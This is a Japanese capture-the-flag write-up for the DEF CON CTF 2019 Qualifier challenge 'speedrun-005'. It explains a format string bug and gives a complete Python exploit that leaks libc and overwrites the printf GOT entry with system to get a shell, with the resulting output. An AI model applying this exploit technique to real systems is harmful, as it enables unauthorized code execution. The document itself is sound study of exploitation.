# [pwn 5pts] speedrun-005 - DEF CON CTF 2019 Qualifier
64ビットでPIEやRELROは無効です。
```
$ checksec -f speedrun-005
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		2	speedrun-005
```
FSBがあります。
1回目でputsをmainにし、2回目以降でlibc leakなどします。
動くone gadgetがなかったので、printfのGOTをsystemに書き換えて入力したコマンドが実行されるようにしました。

```python
import threading
from ptrlib import *
from time import sleep

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./speedrun-005")

#sock = Socket("speedrun-005.quals2019.oooverflow.io", 31337)
sock = Process("./speedrun-005")

got_puts = 0x000000601018
got_printf = 0x000000601028
addr_start = 0x40069d
one_gadget = 0x4f2c5 + 0x8d3000

# Stage 1
payload = ""
n = 0
for i in range(8):
    l = ((((addr_start >> (i * 8)) & 0xff) - n - 1) & 0xff) + 1
    payload += "%{}c%{}$hhn".format(l, 6 + 12 + i)
    n += l
payload += "A" * (8 - (len(payload) % 8))
payload = str2bytes(payload)
for i in range(8):
    payload += p64(got_puts + i)
sock.recvuntil("time?")
sock.sendline(payload)

# Stage 2
sock.recvuntil("time?")
payload = "%{}$p".format(0x400 // 8 + 145)
sock.sendline(payload)
sock.recvuntil("Interesting ")
libc_base = int(sock.recvline(), 16) - libc.symbol("__libc_start_main") - 0xe7
dump("libc base = " + hex(libc_base))

# Stage 3
payload = ""
n = 0
addr_system = libc_base + libc.symbol("system")
for i in range(8):
    l = ((((addr_system >> (i * 8)) & 0xff) - n - 1) & 0xff) + 1
    payload += "%{}c%{}$hhn".format(l, 6 + 12 + i)
    n += l
payload += "A" * (8 - (len(payload) % 8))
payload = str2bytes(payload)
for i in range(8):
    payload += p64(got_printf + i)
print(payload)
sock.recvuntil("time?")
sock.sendline(payload)

# get the shell!

sock.interactive()
```

良い感じ。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=16183)
[ptrlib] libc base = 0x7f788651d000
b'%64c%18$hhn%132c%19$hhn%146c%20$hhn%48c%21$hhn%242c%22$hhn%7c%23$hhn%129c%24$hhn%256c%25$hhnAAAA(\x10`\x00\x00\x00\x00\x00)\x10`\x00\x00\x00\x00\x00*\x10`\x00\x00\x00\x00\x00+\x10`\x00\x00\x00\x00\x00,\x10`\x00\x00\x00\x00\x00-\x10`\x00\x00\x00\x00\x00.\x10`\x00\x00\x00\x00\x00/\x10`\x00\x00\x00\x00\x00'
 Interesting                                                                                                                                                                                                   À                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                    ¬      %                                                                                                                                h                                                                                                                                                                                                                                                               %AAAA(`[ptrlib]$ sh: 1: What: not found
sh: 1: Interesting: not found
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
sh: 1: What: not found
```

# 感想
面白かったです。
恥ずかしながらこれ解くまでx64のFSBで同時に複数のアドレスに書き込めることを知らなかった。
ちなみに本番ではローカルとリモートのバイナリが違うというミスがあり、それにも関わらず何チームか解いてしまったため運営も言うに言えない状況だったそうです。
